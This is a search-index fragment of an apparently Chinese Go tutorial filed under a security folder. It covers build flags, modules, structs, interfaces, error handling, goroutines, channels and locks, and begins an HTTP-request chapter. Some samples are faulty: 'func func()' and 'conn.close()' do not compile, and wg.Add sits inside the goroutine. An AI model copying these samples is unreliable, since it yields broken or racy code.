mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305 go \u53d8\u91cf\u4e0e\u5e38\u91cf # \u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 ) go \u7ed3\u6784\u4f53 # \u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) } go \u63a5\u53e3 # \u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) } go \u5f02\u5e38\u5904\u7406 # \u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () } go \u5e76\u53d1\u4e0e\u4fe1\u9053 # \u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) } go \u9501\u4e0eWaitGroup # go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u7b2c\u4e00\u7ae0-golang\u57fa\u7840","text":"","title":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#\u73af\u5883\u642d\u5efa","text":"\u76f8\u5173\u6587\u7ae0: vscode\u642d\u5efago\u8bed\u8a00\u5f00\u53d1\u73af\u5883","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-build","text":"\u5c06go\u6587\u4ef6\u7f16\u8bd1\u6210\u53ef\u6267\u884c\u6587\u4ef6 go build hello.go \u53bb\u9664\u8c03\u8bd5\u4fe1\u606f\u548c\u7b26\u53f7\u8868\u4ee5\u8282\u7ea6\u53ef\u6267\u884c\u6587\u4ef6\u5927\u5c0f go build -ldflags \"-w -s\" \u4ea4\u53c9\u7f16\u8bd1(\u5982\u4f7f\u7528windows\u7f16\u8bd1\u6210linux\u7684\u53ef\u6267\u884c\u6587\u4ef6) SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build -ldflags \"-s -w\" -o hello hello.go","title":"go build"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-doc","text":"\u76f8\u5173\u6587\u7ae0: godoc \u547d\u4ee4\u548c golang \u4ee3\u7801\u6587\u6863\u7ba1\u7406 # \u67e5\u770b\u76ee\u6807\u5305\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] # \u67e5\u770b\u76ee\u6807\u5305\u7684\u67d0\u5185\u5bb9\u7684\u6587\u6863\u7d22\u5f15 go doc [ targetPackage ] . [ \u51fd\u6570\u540d ] # \u6216\u8005\u7a7a\u683c\u9694\u5f00\u4e5f\u663e\u793a\u67d0\u5185\u5bb9\u7684\u6587\u6863 go doc [ targetPackage ] [ \u51fd\u6570\u540d ] # \u5b50\u5305\u7684\u6587\u6863\u6ce8\u91ca go doc [ targetPackage ] / [ subpackage ] # \u4ee3\u7801\u6587\u6863\u7f16\u5199, \u6309 go \u7684\u6807\u51c6\u6ce8\u91ca\u5199\u6cd5\u7f16\u5199 // Biz implements a business type Biz struct { } // business initialization func ( b *Biz ) Init () { }","title":"go doc"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-modgolang-v111\u53ca\u4ee5\u4e0a","text":"\u76f8\u5173\u6587\u7ae0: go mod \u4f7f\u7528 # \u914d\u7f6e go mod export GO111MODULE = true # \u521b\u5efa\u65b0\u9879\u76ee go mod init hello # \u63a5\u4e0b\u6765\u51e0\u4e4e\u53ef\u4ee5\u4e0d\u7528\u7ba1\u4e86,\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305\u65f6import, \u5728\u8fd0\u884c\u65f6\u4f1a\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4f9d\u8d56 # go module \u5b89\u88c5 package \u7684\u539f\u5247\u662f\u5148\u62c9\u6700\u65b0\u7684 release tag\uff0c\u82e5\u65e0tag\u5219\u62c9\u6700\u65b0\u7684commit # \u4f7f\u7528go get\u65f6\u4e5f\u4f1a\u7531go mod\u63a5\u7ba1 # \u8fd0\u884c go get -u \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u6b21\u8981\u7248\u672c\u6216\u8005\u4fee\u8ba2\u7248\u672c(x.y.z, z\u662f\u4fee\u8ba2\u7248\u672c\u53f7\uff0c y\u662f\u6b21\u8981\u7248\u672c\u53f7) # \u8fd0\u884c go get -u=patch \u5c06\u4f1a\u5347\u7ea7\u5230\u6700\u65b0\u7684\u4fee\u8ba2\u7248\u672c # \u8fd0\u884c go get package@version \u5c06\u4f1a\u5347\u7ea7\u5230\u6307\u5b9a\u7684\u7248\u672c\u53f7version # \u8fd0\u884cgo get\u5982\u679c\u6709\u7248\u672c\u7684\u66f4\u6539\uff0c\u90a3\u4e48go.mod\u6587\u4ef6\u4e5f\u4f1a\u66f4\u6539 # \u4f7f\u7528go mod\u65f6\u5f15\u5165\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u7684\u5305\u4e0d\u80fd\u518d\u4f7f\u7528 ./package, \u800c\u662f\u4f7f\u7528 project/package # \u5e38\u7528\u7684go mod\u547d\u4ee4 go mod tidy # \u81ea\u52a8\u5b89\u88c5\u6240\u7f3a\u7684\u4f9d\u8d56\u5305\u4ee5\u53ca\u53bb\u9664\u65e0\u7528\u7684\u4f9d\u8d56\u5305","title":"go mod(golang v1.11\u53ca\u4ee5\u4e0a)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u53d8\u91cf\u4e0e\u5e38\u91cf","text":"\u76f8\u5173\u6587\u7ae0 Go\u4e94\u79cd\u5b9a\u4e49\u53d8\u91cf\u7684\u65b9\u6cd5 \u5728\u51fd\u6570\u4e4b\u5916\u4e0d\u80fd\u4f7f\u7528 a := value \u7684\u8bed\u53e5\u5b9a\u4e49\u53d8\u91cf \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf var ( WG sync . WaitGroup LOCK sync . Mutex ) \u901a\u5e38\u4f7f\u7528\u4ee5\u4e0b\u8bed\u53e5\u5b9a\u4e49\u5e38\u91cf const ( PI float64 = 3.14 WEIGHT int = 5 )","title":"go \u53d8\u91cf\u4e0e\u5e38\u91cf"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u7ed3\u6784\u4f53","text":"\u76f8\u5173\u6587\u7ae0 Go Struct \u8d85\u8be6\u7ec6\u8bb2\u89e3 \u7279\u522b\u6ce8\u610f\u7684\u662fgo\u7ed3\u6784\u4f53\u4e2d\u7684\u533f\u540d\u5b57\u6bb5,\u770b\u4ee5\u4e0b\u4e24\u79cd\u5199\u6cd5 // \u5199\u6cd5\u4e00 package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion Animal // Lion\u662fAnimal\u7684\u522b\u540d,\u8fd9\u6837\u53ea\u80fd\u7ee7\u627fAnimal\u7684\u5c5e\u6027,\u800c\u65e0\u6cd5\u8c03\u7528Animal\u7684\u65b9\u6cd5,\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u63a5\u53e3/\u5b9e\u73b0func (a *Lion) Run() func main () { var lion = Lion { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , } // \u65e0\u6cd5\u8c03\u7528lion.Run() fmt . Println ( lion . Name ) } // \u5199\u6cd5\u4e8c package main import ( \"fmt\" ) type Animal struct { Name string Color string } func ( a * Animal ) Run () { fmt . Println ( a . Name , a . Color ) } type Lion struct { Animal //\u533f\u540d\u5b57\u6bb5,\u8fd9\u6837\u7ec4\u5408\u4e86Animal\u7684\u7279\u6027,\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528func (a *Animal) Run() } func main () { var lion = Lion { Animal { Name : \"\u5c0f\u72ee\u5b50\" , Color : \"\u7070\u8272\" , }, } lion . Run () fmt . Println ( lion . Name ) }","title":"go \u7ed3\u6784\u4f53"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u63a5\u53e3","text":"\u76f8\u5173\u6587\u7ae0 Go\u8bed\u8a00\u7684\u63a5\u53e3interface,struct\u7684\u7ec4\u5408\u4e0e\u7ee7\u627f go\u4e2d\u5b9a\u4e49\u63a5\u53e3\u4f7f\u7528type\u548cinterface\u5173\u952e\u5b57 \u5728Go\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2ainterface\u7c7b\u578b\uff0c\u8be5\u7c7b\u578b\u8bf4\u660e\u4e86\u5b83\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u7136\u540e\u5728\u5176\u4ed6\u7684\u51fd\u6570\u4e2d\uff0c\u5c06\u8be5interface\u7c7b\u578b\u4f5c\u4e3a\u51fd\u6570\u7684\u5f62\u53c2\uff0c\u4efb\u610f\u4e00\u4e2a\u5b9e\u73b0\u4e86interface\u7c7b\u578b\u7684\u5b9e\u53c2\u90fd\u80fd\u4f5c\u4e3a\u8be5interface\u7684\u5b9e\u4f8b\u5bf9\u8c61 \u793a\u4f8b\u5982\u4e0b package main import \"fmt\" type Animal interface { Say () } type Dog struct { age int } func ( a * Dog ) Say () { fmt . Println ( \"Dog say: I am \" , a . age ) } type Cat struct { age int } func ( a * Cat ) Say () { fmt . Println ( \"Cat say: I am \" , a . age ) } func AnimalSay ( a Animal ) { a . Say () } func main () { dog := Dog { age : 2 } cat := Cat { age : 3 } AnimalSay ( & dog ) AnimalSay ( & cat ) }","title":"go \u63a5\u53e3"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5f02\u5e38\u5904\u7406","text":"\u76f8\u5173\u6587\u7ae0: Golang\u5f02\u5e38\u5904\u7406\u673a\u5236 Golang\u9519\u8bef\u548c\u5f02\u5e38\u5904\u7406\u7684\u6b63\u786e\u59ff\u52bf go\u4e2d\u4f7f\u7528 defer, error, panic, recover \u5904\u7406\u5f02\u5e38 defer defer\u5173\u952e\u5b57\u7528\u6765\u6807\u8bb0\u6700\u540e\u6267\u884c\u7684Go\u8bed\u53e5\uff0c\u4e00\u822c\u7528\u5728\u8d44\u6e90\u91ca\u653e\u3001\u5173\u95ed\u8fde\u63a5\u7b49\u64cd\u4f5c\uff0c\u4f1a\u5728\u51fd\u6570\u5173\u95ed\u524d\u8c03\u7528\u3002 \u591a\u4e2adefer\u7684\u5b9a\u4e49\u4e0e\u6267\u884c\u7c7b\u4f3c\u4e8e\u6808\u7684\u64cd\u4f5c\uff1a\u5148\u8fdb\u540e\u51fa\uff0c\u6700\u5148\u5b9a\u4e49\u7684\u6700\u540e\u6267\u884c\u3002 import ( \"net\" \"fmt\" ) func func () { conn , err := net . Dial ( \"tcp\" , \"127.0.0.1:8080\" ) defer conn . close () if err != nil { fmt . Println ( \"Connect Error:\" , err ) } else { fmt . Println ( \"Connect OK.\" ) } } error error\u7684\u63a5\u53e3\u5982\u4e0b type error interface { Error () string } \u4e00\u822c\u6211\u4eec\u4f7f\u7528errors.New()\u6216fmt.Errorf()\u6765\u751f\u6210\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u4fe1\u606f \u5047\u5982error\u6bd4\u8f83\u590d\u6742\u9700\u8981\u81ea\u5b9a\u4e49,\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u5e76\u4e14\u5b9e\u73b0\u5bf9\u5e94\u65b9\u6cd5\u6765\u81ea\u5b9a\u4e49\u9519\u8bef package main import ( \"fmt\" \"strconv\" ) type TestError struct { ErrorCode int } func ( err * TestError ) Error () string { return \"TestError: error code \" + strconv . Itoa ( err . ErrorCode ) } func Test () error { return & TestError { ErrorCode : 1 , } } func main () { err := Test () if err != nil { fmt . Println ( err ) fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () }","title":"go \u5f02\u5e38\u5904\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5e76\u53d1\u4e0e\u4fe1\u9053","text":"\u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) }","title":"go \u5e76\u53d1\u4e0e\u4fe1\u9053"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u9501\u4e0ewaitgroup","text":"go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"go \u9501\u4e0eWaitGroup"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/","text":"\u7b2c\u4e09\u7ae0-HTTP # \u4e86\u89e3net/http\u5305 # \u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () } \u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42 # NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) 